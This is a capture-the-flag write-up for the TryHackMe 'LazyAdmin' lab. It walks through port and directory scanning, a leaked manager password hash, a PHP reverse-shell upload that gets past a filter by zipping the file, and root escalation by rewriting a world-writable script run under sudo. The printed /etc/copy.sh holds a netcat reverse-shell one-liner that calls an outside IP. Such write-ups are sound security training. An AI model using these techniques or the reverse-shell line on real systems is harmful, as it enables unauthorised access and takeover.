# LazyAdmin

```
export IP=10.10.120.19
```

## Task 1

1. What is the user flag?

  Basic recon to see what is open. Looks like we just have a webpage and SSH:

  ```bash
  jeffrowell@kali:~/Documents/TryHackMe/LazyAdmin$ nmap -sC -sV -Pn -n -oN nmap/initial $IP
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-21 22:10 MDT
  Nmap scan report for 10.10.120.19
  Host is up (0.14s latency).
  Not shown: 998 closed ports
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
  |   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
  |_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  |_http-title: Apache2 Ubuntu Default Page: It works
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 38.30 seconds
  ```

  Seeing what is open on the webpage, we first find that there is a `/content` directory:

  ```bash
  jeffrowell@kali:~/Documents/TryHackMe/LazyAdmin$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js
  ===============================================================
  Gobuster v3.0.1
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
  ===============================================================
  [+] Url:            http://10.10.120.19
  [+] Threads:        10
  [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  [+] Status codes:   200,204,301,302,307,401,403
  [+] User Agent:     gobuster/3.0.1
  [+] Extensions:     html,js,php,txt
  [+] Timeout:        10s
  ===============================================================
  2020/05/21 22:10:32 Starting gobuster
  ===============================================================
  /index.html (Status: 200)
  /content (Status: 301)
  ```

  Now running gobuster on the `/content` directory, we find even more directories to explore:

  ```bash
  jeffrowell@kali:~/Documents/TryHackMe/LazyAdmin$ gobuster dir -u http://$IP/content/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js
  ===============================================================
  Gobuster v3.0.1
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
  ===============================================================
  [+] Url:            http://10.10.120.19/content/
  [+] Threads:        10
  [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  [+] Status codes:   200,204,301,302,307,401,403
  [+] User Agent:     gobuster/3.0.1
  [+] Extensions:     php,txt,html,js
  [+] Timeout:        10s
  ===============================================================
  2020/05/21 22:40:43 Starting gobuster
  ===============================================================
  /index.php (Status: 200)
  /images (Status: 301)
  /license.txt (Status: 200)
  /js (Status: 301)
  /changelog.txt (Status: 200)
  /inc (Status: 301)
  /as (Status: 301)
  /_themes (Status: 301)
  /attachment (Status: 301)
  ```

  In the `/content/inc/` dirctory is another directory with MySQL backups that we can access and download. Downloading the file and looking through it, we find the MD5 hash of the manager:
  MySQL backup:
  ```
  \\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\"
  ```

  Cool, so we have a password but nowhere to use it yet. Continuing to explore the findings from gobuster, the `/content/as` endpoint prompts for a username and password, where we log in as manager.

  We can upload a PHP reverse shell in the `media center` section of the web app. After trying to upload the PHP file standalone seems to fail, but there is an option to upload as a zip file and have the website unzip upon upload:

  ![loaded_zip](https://user-images.githubusercontent.com/32188816/82636987-12863480-9bc1-11ea-8600-565c95cd6e3f.png)

  Ziping the file then uploading seems to bypass the WAF, and the website renamed our PHP file with a hash:

  ![uploaded_unzipped_revshell](https://user-images.githubusercontent.com/32188816/82636992-144ff800-9bc1-11ea-9764-2206ac8a9c3a.png)

  Setting up our listener catches the shell, and we find the user flag in `/home/itguy/user.txt`:

  ```bash
  $ cat /home/itguy/user.txt
  THM{<REDACTED>}
  ```

2. What is the root flag?

  No onto the root flag. First let us check to see what commands we can run with elevated privileges:

  ```bash
  $ sudo -l
  Matching Defaults entries for www-data on THM-Chal:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User www-data may run the following commands on THM-Chal:
      (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
  ```

  Lets check out exactly what this perl file does:

  ```bash
  $ cat /home/itguy/backup.pl
  #!/usr/bin/perl

  system("sh", "/etc/copy.sh");
  ```

  Simple enough, it just spawns a shell and executes the `/etc/copy.sh` script. So what does the `/etc/copy.sh` script do?

  ```bash
  $ cat /etc/copy.sh
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
  $ ls -alh /etc/copy.sh
  -rw-r--rwx 1 root root 81 May 22 08:49 /etc/copy.sh
  ```

  So we have write access to `/etc/copy.sh` so we can blank that file and put our payload in there to checkout root's home directory and get the root flag:

  ```bash
  $ > /etc/copy.sh
  $ echo 'ls /root' >> /etc/copy.sh
  $ cat /etc/copy.sh
  ls /root
  $ sudo /usr/bin/perl /home/itguy/backup.pl
  root.txt
  $ > /etc/copy.sh
  $ echo "cat /root/root.txt" >> /etc/copy.sh
  $ sudo /usr/bin/perl /home/itguy/backup.pl
  THM{<REDACTED>}
  ```
